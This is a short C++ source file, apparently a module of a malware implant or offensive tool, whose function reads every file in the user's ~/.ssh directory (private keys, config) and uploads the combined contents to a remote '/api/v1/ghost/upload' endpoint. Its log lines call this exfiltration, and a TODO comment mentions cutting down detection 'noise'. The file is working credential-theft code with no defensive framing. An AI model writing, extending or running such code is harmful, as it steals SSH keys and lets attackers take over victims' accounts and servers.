#include "modules/gathering/Ssh.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Logger.hpp"
#include "network/Comms.hpp"

bool SshMethod::trigger() {
    std::string homeDir = SystemUtils::GetUserHome();
    std::string sshDir = homeDir + "/.ssh";

    std::vector<std::string> files = FileUtils::ListFilesRecursively(sshDir);
    std::string data;

    int successCount = 0;
    for (const auto& filePath : files) {
        LOG_INFO("Attempting exfiltration of {}", filePath)
        data += "=== " + filePath + " ===";
        data += FileUtils::ReadFile(filePath);
        data += '\n';

        successCount++;
    }

    if (data.empty()) return false;

    // TODO: think about aggregating all info and sending in one request, this is highly inefficient and generates a lot of noise
    LOG_INFO("Uploading ssh creds and config")
    return Comms::UploadFile("/api/v1/ghost/upload", "ssh.txt", data);
}
